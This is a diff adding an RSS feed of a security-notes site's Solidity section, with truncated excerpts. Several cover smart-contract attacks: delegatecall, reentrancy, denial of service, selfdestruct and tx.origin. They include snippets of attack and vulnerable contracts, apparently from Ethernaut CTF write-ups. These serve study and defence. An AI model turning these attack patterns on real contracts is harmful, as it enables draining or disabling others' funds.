@@ -1,0 +1,103 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Smart Contract on D0CUM3NTN4T10N</title>
+    <link>https://documentnation.github.io/docs/hdks/blockchain/smart-contract/</link>
+    <description>Recent content in Smart Contract on D0CUM3NTN4T10N</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Wed, 17 Jan 2024 15:30:13 +0530</lastBuildDate>
+    <atom:link href="https://documentnation.github.io/docs/hdks/blockchain/smart-contract/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Solidity Assembly</title>
+      <link>https://documentnation.github.io/docs/hdks/blockchain/smart-contract/solidity-assembly/</link>
+      <pubDate>Thu, 05 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/blockchain/smart-contract/solidity-assembly/</guid>
+      <description>Simple Example link pragma solidity ^0.8.0; contract Simple { constructor(address _addr) { assembly { // Get the size of the code let size := extcodesize(_addr); // Allocate output byte array code := mload(0x40); // New &amp;#34;memory end&amp;#34; including padding mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f)))); // Store length in memory mstore(code, size); // Retrieve the code extcodecopy(addr, add(code, 0x20), 0, size); } } } From Opcode link pragma solidity ^0.8.0; contract Opcode { constructor() { address myContract; bytes memory opcode = &amp;#34;\x60\x0a\x60\x0c\x60\x00\x39\x60\x0a\x60\x00\xf3\x60\x2a\x60\x80\x52\x60\x20\x60\x80\xf3&amp;#34;; assembly { myContract := create(0, add(opcode, 0x20), mload(opcode)) } // Some code here.</description>
+    </item>
+    <item>
+      <title>Solidity Storage Values Analysis</title>
+      <link>https://documentnation.github.io/docs/hdks/blockchain/smart-contract/solidity-storage-values-analysis/</link>
+      <pubDate>Mon, 02 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/blockchain/smart-contract/solidity-storage-values-analysis/</guid>
+      <description>Data Byte Sizes linkReference: https://tomatosauce.jp/datatype-bytesize/&#xA;In Solidity, each data type has the following size:&#xA;Type Bytes bool 1 bytes1 1 bytes8 8 bytes16 16 bytes32 32 address 20 contract 20 uint8/int8 1 uint16/int16 2 uint32/int32 4 uint64/int64 8 uint128/int128 16 uint256/int256 32 Access Storage Slot Values linkReference: https://coinsbench.com/12-privacy-ethernaut-explained-8ee480f303f2&#xA;Below is the Solidity contract example.&#xA;The Solidity’s each slot can store data until 32 bytes. For example below, the ‘Slot 2’ stores multiple variables because each value is just 1 byte, which are 2 bytes in total so less than 32 bytes.</description>
+    </item>
+    <item>
+      <title>Web3.js Cheat Sheet</title>
+      <link>https://documentnation.github.io/docs/hdks/blockchain/smart-contract/web3-js-cheat-sheet/</link>
+      <pubDate>Mon, 02 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/blockchain/smart-contract/web3-js-cheat-sheet/</guid>
+      <description>Blocks link // Get block web3.eth.getBlock(&amp;#39;latest&amp;#39;) Converting link // Wei to Ether web3.utils.fromWei(&amp;#39;1000000000000000000&amp;#39;, &amp;#39;ether&amp;#39;) // &amp;#34;1&amp;#34; // Ether to Wei web3.utils.toWei(&amp;#39;0.001&amp;#39;) // &amp;#34;1000000000000000&amp;#34; Contract link // Initialize a contract const tokenAbi = [...]; // JSON interface const tokenAddress = &amp;#39;0x1234...&amp;#39;; const contract = new web3.eth.Contract(tokenAbi, tokenAddress); Send Ether to Contract link // Send ether to the contract with interacting ABI contract.example({value: web3.utils.toWei(&amp;#39;0.001&amp;#39;)}) // Send ether to the contract from outside contract.</description>
+    </item>
+    <item>
+      <title>Solidity Contract Address Recovery</title>
+      <link>https://documentnation.github.io/docs/hdks/blockchain/smart-contract/solidity-contarct-address-recovery/</link>
+      <pubDate>Sat, 30 Sep 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/blockchain/smart-contract/solidity-contarct-address-recovery/</guid>
+      <description>Create a Contract for Recovery Address linkThis contract can compute the contract address which has been lost.&#xA;// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract ContractRecovery { constructor(address _creatorAddress) { address lostAddress = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(_creatorAddress), bytes1(0x01)))))); // some code here ... } } Another way is to use Etherscan transaction history.</description>
+    </item>
+    <item>
+      <title>Solidity Conversion</title>
+      <link>https://documentnation.github.io/docs/hdks/blockchain/smart-contract/solidity-conversion/</link>
+      <pubDate>Sat, 30 Sep 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/blockchain/smart-contract/solidity-conversion/</guid>
+      <description>Explicit Conversion linkWhen we cast a smaller type to a bigger type, there&amp;rsquo;s no problem. However, when we cast a bigger type to a smaller type, data may be lost partially.&#xA;Uint/Int link // uint32 -&amp;gt; uint16 uint32 a = 0x12345678; uint16 b = uint16(a); // 0x5678 // uint16 -&amp;gt; uint32 uint16 a = 0x1234; uint32 b = uint32(a); // 0x00001234 Bytes link // bytes2 -&amp;gt; bytes1 bytes2 a = 0x1234; bytes1 b = bytes1(a); // 0x12 // bytes2 -&amp;gt; bytes4 bytes2 a = 0x1234; bytes4 b = bytes4(a); // 0x12340000 </description>
+    </item>
+    <item>
+      <title>Solidity Delegatecall Attack</title>
+      <link>https://documentnation.github.io/docs/hdks/blockchain/smart-contract/solidity-delegatecall-attack/</link>
+      <pubDate>Sat, 30 Sep 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/blockchain/smart-contract/solidity-delegatecall-attack/</guid>
+      <description>Exploitation linkReference: https://github.com/Macmod/ethernaut-writeups/blob/master/4-delegation.md&#xA;1. Vulnerable Contract linkBelow is the example contracts from Ethernaut. That uses delegatecall method in the fallback() function.&#xA;// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract DelegateA { address public owner; constructor(address _owner) { owner = _owner; } function pwn() public { owner = msg.sender; } } contract DelegateB { address public owner; DelegateA delegateA; constructor(address _delegateA) { delegateA = Delegate(_delegateA); owner = msg.sender; } fallback() external { (bool result,) = address(delegateA).</description>
+    </item>
+    <item>
+      <title>Solidity Denial of Service Attack</title>
+      <link>https://documentnation.github.io/docs/hdks/blockchain/smart-contract/solidity-denial-of-service-attack/</link>
+      <pubDate>Sat, 30 Sep 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/blockchain/smart-contract/solidity-denial-of-service-attack/</guid>
+      <description>DoS with Assembly Invalid Function linkThe invalid() opcode in in-line assembly consumes all the gas and causes Dos for the contract.&#xA;// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Victim { address public owner; uint public balance; function withdrawUser(address _address) { (bool success, ) = _address.call{value: balance}(&amp;#34;&amp;#34;); // Some code ... } } contract Attack { Victim target; constructor(address _targetAddress) { target = Victim(_targetAddress); target.withdrawUser(address(this)); } fallback() payable external { assembly { invalid() } } } </description>
+    </item>
+    <item>
+      <title>Solidity Self Destruct Attack</title>
+      <link>https://documentnation.github.io/docs/hdks/blockchain/smart-contract/solidity-self-destruct-attack/</link>
+      <pubDate>Sat, 30 Sep 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/blockchain/smart-contract/solidity-self-destruct-attack/</guid>
+      <description>Create a Malicious Contract for Destructing Contract link // SPDX-License-Identifier: MIT pragma solidity ^0.4.0; contract Attack { function attack(address _address) payable public { // the remaining Ether sent to _address when destructing selfdestruct(_address); } } </description>
+    </item>
+    <item>
+      <title>Solidity Smart Contract Attack Methodology</title>
+      <link>https://documentnation.github.io/docs/hdks/blockchain/smart-contract/solidity-smart-contract-attack-methodology/</link>
+      <pubDate>Sat, 30 Sep 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/blockchain/smart-contract/solidity-smart-contract-attack-methodology/</guid>
+      <description>Create an Attack Contract link // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; // Define interface for victim contract interface IVictim { // Set the Victim contract functions function example1() external; function example2(uint) external; } // Define Attack contract to compromise the victim contract contract Attack { IVictim public victim; constructor(address _victimAddress) { // Initialize Victim contract (interface) victim = IVictim(_victimAddress); } // Create a function to be used for attacking the victim contract function attack() public { victim.</description>
+    </item>
+    <item>
+      <title>Solidity Overflow &amp; Underflow</title>
+      <link>https://documentnation.github.io/docs/hdks/blockchain/smart-contract/solidity-overflow-and-underflow/</link>
+      <pubDate>Wed, 27 Sep 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/blockchain/smart-contract/solidity-overflow-and-underflow/</guid>
+      <description>Overflow link uint8 value = 255; value&amp;#43;&amp;#43;; // Result: value = 0 Underflow link uint8 value = 0; value--; // Result: value = 255 </description>
+    </item>
+    <item>
+      <title>Solidity Reentrancy Attack</title>
+      <link>https://documentnation.github.io/docs/hdks/blockchain/smart-contract/solidity-reentrancy-attack/</link>
+      <pubDate>Wed, 27 Sep 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/blockchain/smart-contract/solidity-reentrancy-attack/</guid>
+      <description>Create a Malicious Contract linkThe Attack contract executes the following:&#xA;Attack contract deposits the address itself by invoking the Victim deposit function. Attack contract calls the Victim withdraw function. The fallback function of Attack contract is called and withdraw to send Ether to Attack contract. pragma solidity ^0.8.0; contract Victim { function deposit(address _to) public payable; function withdraw(uint _amount) public; } contract Attack { Victim public victim; constructor(address _victimAddress) { // Instantiate a victim contract victim = Victim(_victimAddress); } function attack(uint v) external payable { // Deposit to this contract (Attack) address victim.</description>
+    </item>
+    <item>
+      <title>Solidity Tx Origin Attack</title>
+      <link>https://documentnation.github.io/docs/hdks/blockchain/smart-contract/solidity-tx-origin-attack/</link>
+      <pubDate>Wed, 27 Sep 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/blockchain/smart-contract/solidity-tx-origin-attack/</guid>
+      <description>Inappropriate User Authorization linkReference: https://docs.soliditylang.org/en/develop/security-considerations.html#tx-origin&#xA;// Vulnerable: comparing the contract owner with tx.origin require(tx.origin == owner) // Vulnerable: require(tx.origin == msg.sender) 1. Vulnerable Wallet linkFor example, the following wallet validates a user with tx.origin == owner. However, this tx.origin is vulnerable because tx.origin is not&#xA;// SPDX-License-Identifier: GPL-3.0 pragma solidity ^0.8.0; contract VulnWallet { address owner; constructor() { owner = msg.sender; } function transferTo(address payable _to, uint amount) public { require(tx.</description>
+    </item>
+    <item>
+      <title>Compile, Deploy, Run Smart Contract</title>
+      <link>https://documentnation.github.io/docs/hdks/blockchain/smart-contract/compile-deploy-run-smart-contract/</link>
+      <pubDate>Sun, 26 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/blockchain/smart-contract/compile-deploy-run-smart-contract/</guid>
+      <description>Ethereum Remix Extension in VS Code linkEthereum Remix extension is the VS Code plugin that can perform a variety of tasks such as verifying contracts.&#xA;1. Connect linkIn the left pane, click Explorer tab and open the &amp;ldquo;REMIX&amp;rdquo; field at the bottom. Then choose &amp;ldquo;Run &amp;amp; Deploy&amp;rdquo; and select &amp;ldquo;Activate&amp;rdquo;. The &amp;ldquo;Run &amp;amp; Deploy&amp;rdquo; window opens.&#xA;In Connection field, enter the address and click Connect.&#xA;2. Compile linkNext, select the file you want to compile, and click Compile.</description>
+    </item>
+  </channel>
+</rss>
